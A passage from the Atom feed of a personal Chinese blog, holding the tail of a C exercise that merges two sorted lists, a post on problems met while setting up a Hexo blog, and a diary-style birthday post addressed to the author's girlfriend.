class=&quot;line&quot;&gt;77&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;78&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;79&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;80&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;81&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;82&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;83&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;84&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;85&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;86&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;87&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;88&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;89&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;90&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;91&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt;&lt;span class=&quot;meta-string&quot;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt;&lt;span class=&quot;meta-string&quot;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;typedef&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; elemtype;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;typedef&lt;/span&gt; &lt;span class=&quot;class&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;struct&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    elemtype data[&lt;span class=&quot;number&quot;&gt;500&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; length;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;sqlist;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;initlist&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(sqlist &lt;em&gt;&amp;amp;L)&lt;/em&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    L=(sqlist )&lt;span class=&quot;built_in&quot;&gt;malloc&lt;/span&gt;(&lt;span class=&quot;keyword&quot;&gt;sizeof&lt;/span&gt;(sqlist));&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    L-&amp;gt;length=&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &amp;#125; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;creatlist&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(sqlist &lt;em&gt;&amp;amp;L,elemtype a[],&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; n)&lt;/em&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; i=&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt;(i=&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;i&amp;lt;n;i++)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        L-&amp;gt;data[i]=a[i];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    L-&amp;gt;length=n;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;desplist&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(sqlist L)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; i;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;built_in&quot;&gt;printf&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;“%d”&lt;/span&gt;,L-&amp;gt;data[&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt;(i=&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;;i&amp;lt; L-&amp;gt;length;i++)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;built_in&quot;&gt;printf&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;“ %d”&lt;/span&gt;,L-&amp;gt;data[i]);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;built_in&quot;&gt;printf&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;“\n”&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;Combine&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(sqlist &lt;em&gt;&amp;amp;la,sqlist &lt;/em&gt;&amp;amp;lb,sqlist &lt;em&gt;&amp;amp;lc)&lt;/em&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;/span&gt;&amp;#123;   &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; i=&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;,j=&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;,k=&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;while&lt;/span&gt;(i&amp;lt;la-&amp;gt;length&amp;amp;&amp;amp;j&amp;lt;lb-&amp;gt;length)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(la-&amp;gt;data[i]&amp;lt;=lb-&amp;gt;data[j])&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            lc-&amp;gt;data[k]=la-&amp;gt;data[i];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            k++;i++;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            lc-&amp;gt;data[k]=lb-&amp;gt;data[j];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            k++;j++;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;while&lt;/span&gt;(i&amp;lt;la-&amp;gt;length)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        lc-&amp;gt;data[k]=la-&amp;gt;data[i];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        k++;i++;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;while&lt;/span&gt;(j&amp;lt;lb-&amp;gt;length)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        lc-&amp;gt;data[k]=lb-&amp;gt;data[j];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        k++;j++;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    lc-&amp;gt;length=k;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    sqlist la;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    sqlist &lt;em&gt;lb;&lt;/em&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    sqlist lc;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; a[&lt;span class=&quot;number&quot;&gt;1000&lt;/span&gt;],b[&lt;span class=&quot;number&quot;&gt;1000&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; n,m;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;built_in&quot;&gt;scanf&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;“%d”&lt;/span&gt;,&amp;amp;n);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt;(&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; i=&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;i&amp;lt;n;i++)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;built_in&quot;&gt;scanf&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;“%d”&lt;/span&gt;,&amp;amp;a[i]);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;built_in&quot;&gt;scanf&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;“%d”&lt;/span&gt;,&amp;amp;m);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt;(&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; j=&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;j&amp;lt;m;j++)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;built_in&quot;&gt;scanf&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;“%d”&lt;/span&gt;,&amp;amp;b[j]);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    initlist(la);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    initlist(lb);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    initlist(lc);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    creatlist(la,a,n);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    creatlist(lb,b,m);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    Combine(la,lb,lc);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    desplist(lc);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;
    
    </summary>
    
      <category term="python" scheme="http://zhihening.me/categories/python/"/>
    
    
      <category term="题解~" scheme="http://zhihening.me/tags/%E9%A2%98%E8%A7%A3/"/>
    
  </entry>
  
  <entry>
    <title>在我搭建博客中所遇到的坑</title>
    <link href="http://zhihening.me/2018/07/02/%E5%9C%A8%E6%88%91%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%E4%B8%AD%E6%89%80%E9%81%87%E5%88%B0%E7%9A%84%E5%9D%91/"/>
    <id>http://zhihening.me/2018/07/02/在我搭建博客中所遇到的坑/</id>
    <published>2018-07-02T03:22:12.000Z</published>
    <updated>2018-10-03T12:03:26.479Z</updated>
    
    <content type="html"><![CDATA[<h2 id="遇到的第一个坑"><a href="#遇到的第一个坑" class="headerlink" title="遇到的第一个坑"></a>遇到的第一个坑</h2><h3 id="hexo不显示"><a href="#hexo不显示" class="headerlink" title="hexo不显示"></a>hexo不显示</h3><blockquote><p>在安装hexo的过程中输入 hexo -v 查看hexo安装版本的时候，没有显示hexo的版本。<br><a id="more"></a></p></blockquote><blockquote><p>安装完毕后，理应显示的图为：<img src="http://wx3.sinaimg.cn/mw690/007bXaCZgy1fsvv33rd38j30be0963yr.jpg" alt="正常图"></p></blockquote><blockquote><p>然而我的显示图为：<img src="http://wx3.sinaimg.cn/mw690/007bXaCZgy1fsvv4j1hgzj30bf08qaa8.jpg" alt="非正常图"></p></blockquote><blockquote><p>解决办法：<img src="http://wx2.sinaimg.cn/mw690/007bXaCZgy1fsvv4m6liwj30ba05d3ya.jpg" alt="解决办法"> 原理：因为需要git bash到你所创建的子文件中，而不是上一层文件中，在上一层文件中不会显示你所安装过的hexo的版本。</p></blockquote><h2 id="遇到的第二个坑"><a href="#遇到的第二个坑" class="headerlink" title="遇到的第二个坑"></a>遇到的第二个坑</h2><h3 id="背景虚化"><a href="#背景虚化" class="headerlink" title="背景虚化"></a>背景虚化</h3><blockquote><p>在我搭建博客过程中，发现背景要么极暗要么极白，很难调节，加上什么背景图片都很难看清字体。起初我想要更改字体的颜色来弥补，后来发现情况不止如此，问了大佬以后才知道可以去更改一下背景，百度半天虚化背景发现这个<a href="https://blog.csdn.net/qq_22844483/article/details/70157310" target="_blank" rel="noopener">背景</a>，没什么进展，问了一个前端大佬，才修改完毕，具体如下:博客根目录 themes\next\source\css_custom这个文件下的custom.styl文件中修改如下：<img src="http://wx3.sinaimg.cn/mw690/007bXaCZgy1fswmao1amhj30ql0aydhg.jpg" alt="图">。</p></blockquote><h2 id="嗯-其他坑还在踩，欢迎投稿。。"><a href="#嗯-其他坑还在踩，欢迎投稿。。" class="headerlink" title="嗯~其他坑还在踩，欢迎投稿。。"></a>嗯~其他坑还在踩，欢迎投稿。。</h2>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;遇到的第一个坑&quot;&gt;&lt;a href=&quot;#遇到的第一个坑&quot; class=&quot;headerlink&quot; title=&quot;遇到的第一个坑&quot;&gt;&lt;/a&gt;遇到的第一个坑&lt;/h2&gt;&lt;h3 id=&quot;hexo不显示&quot;&gt;&lt;a href=&quot;#hexo不显示&quot; class=&quot;headerlink&quot; title=&quot;hexo不显示&quot;&gt;&lt;/a&gt;hexo不显示&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;在安装hexo的过程中输入 hexo -v 查看hexo安装版本的时候，没有显示hexo的版本。&lt;br&gt;
    
    </summary>
    
      <category term="-解决问题" scheme="http://zhihening.me/categories/%E8%A7%A3%E5%86%B3%E9%97%AE%E9%A2%98/"/>
    
    
      <category term="-问题" scheme="http://zhihening.me/tags/%E9%97%AE%E9%A2%98/"/>
    
  </entry>
  
  <entry>
    <title>Happy Birthday</title>
    <link href="http://zhihening.me/2018/06/27/Happy-Birthday/"/>
    <id>http://zhihening.me/2018/06/27/Happy-Birthday/</id>
    <published>2018-06-27T05:35:59.000Z</published>
    <updated>2019-08-06T09:34:20.004Z</updated>
    
    <content type="html"><![CDATA[<h2 id="记陪你的第一次生日"><a href="#记陪你的第一次生日" class="headerlink" title="记陪你的第一次生日"></a>记陪你的第一次生日</h2><a id="more"></a><h3 id="2017年6月。"><a href="#2017年6月。" class="headerlink" title="2017年6月。"></a>2017年6月。</h3><blockquote><p>回想起高三那年结束前，你我是同桌，你跟我说快过生日了，但却是高考以后。我就想提前送你一些礼物，无他，只因为你是我同桌。</p></blockquote><h3 id="2017年7月。"><a href="#2017年7月。" class="headerlink" title="2017年7月。"></a>2017年7月。</h3><blockquote><p>后来发生了一些很奇妙的事，渐渐的越来越熟，也就是越来越熟。那年六月，一起高考，那年七月，各奔东西。</p></blockquote><h3 id="2017年8月。"><a href="#2017年8月。" class="headerlink" title="2017年8月。"></a>2017年8月。</h3><blockquote><p>一些事就是缘分问题，也确实是很难的。抉择问题。反正是一起来四川了。挺好的。这个月记得的好像是开学。嗯，对，就是开学。</p></blockquote><h3 id="2017年9月。"><a href="#2017年9月。" class="headerlink" title="2017年9月。"></a>2017年9月。</h3><blockquote><p>这个月印象还是蛮不错的，去了一次成都，第一次去呐，还算可以，问了路程，问了方向，问了倒转车，说走就走了。。</p></blockquote><h3 id="2017年10月。"><a href="#2017年10月。" class="headerlink" title="2017年10月。"></a>2017年10月。</h3><blockquote><p>十月一开学，放假7天，没在学校，去成都浪了。见了三年不见的好友，一起大概的走了成都。反正哪里挤去了哪里，反正缘分这东西，说不清楚。</p></blockquote><h3 id="2017年11月。"><a href="#2017年11月。" class="headerlink" title="2017年11月。"></a>2017年11月。</h3><blockquote><p>这个月没什么太大的波浪，仍然保持着一个月或者两周去看一次的习惯。过的波澜不惊。除了复习备考，好像还有美食节？</p></blockquote><h3 id="2017年12月。"><a href="#2017年12月。" class="headerlink" title="2017年12月。"></a>2017年12月。</h3><blockquote><p>这个月还凑合，月初啊，月末啊啥的你就过来了，只是来的好像不是时候，完美错过了东八舞池和元旦晚会呐，真是有点遗憾。</p></blockquote><h3 id="2018年1月。"><a href="#2018年1月。" class="headerlink" title="2018年1月。"></a>2018年1月。</h3><blockquote><p>主要在准备考试和考完试的颓废中生活。还行吧，就这样，不过还发现了美食，等着带你来吃。17号回去，一起坐高铁。真是不错。</p></blockquote><h3 id="2018年2月。"><a href="#2018年2月。" class="headerlink" title="2018年2月。"></a>2018年2月。</h3><blockquote><p>这个月就是在家嘛，打游戏多了，你还是挺生气的。14号那天，之前，做了个小视频，送给你了，也就是个小视频呐。凑合。。地址的话，在空间吧。</p></blockquote><h3 id="2018年3月。"><a href="#2018年3月。" class="headerlink" title="2018年3月。"></a>2018年3月。</h3><blockquote><p>开学的日子，去接你，结果你手机被偷了，虽然事情解决了，可是还是心有余悸呐。以后还是要万分小心。不过月底你还是过来陪我耍了两天。开森。</p></blockquote><h3 id="2018年4月。"><a href="#2018年4月。" class="headerlink" title="2018年4月。"></a>2018年4月。</h3><blockquote><p>清明节的时候过去了，我还真的错不过每次的放假呐。一有时间就还是会去，或许就是单纯想去吧。这个月好像实现了半天来回成都？？</p></blockquote><h3 id="2018年5月。"><a href="#2018年5月。" class="headerlink" title="2018年5月。"></a>2018年5月。</h3><blockquote><p>劳动节的时候去了，也很快就回来了，前一两天，还在学校转悠，第三天还是去了。去了之前没去的地方，还好天气不错。</p></blockquote><h3 id="2018年6月。"><a href="#2018年6月。" class="headerlink" title="2018年6月。"></a>2018年6月。</h3><blockquote><p>因为端午节要考试呐，这个月还是复习备考的一个月，儿童节还是忍住了没去，因为第二天考试。。也在这个月吧，迎来了你的生日呐，还是选择去吧，无他，因为你是我女朋友。</p></blockquote><h3 id="2018年。。。"><a href="#2018年。。。" class="headerlink" title="2018年。。。"></a>2018年。。。</h3><blockquote><p>故事还在继续，那句话咋说来着，我有故事，你有酒吗？</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;记陪你的第一次生日&quot;&gt;&lt;a href=&quot;#记陪你的第一次生日&quot; class=&quot;headerlink&quot; title=&quot;记陪你的第一次生日&quot;&gt;&lt;/a&gt;记陪你的第一次生日&lt;/h2&gt;
    
    </summary>
    
      <category term="-杂记" scheme="http://zhihening.me/categories/%E6%9D%82%E8%AE%B0/"/>
    
    
      <category term="-life" scheme="http://zhihening.me/tags/life/"/>
    
  </entry>
  
</feed>
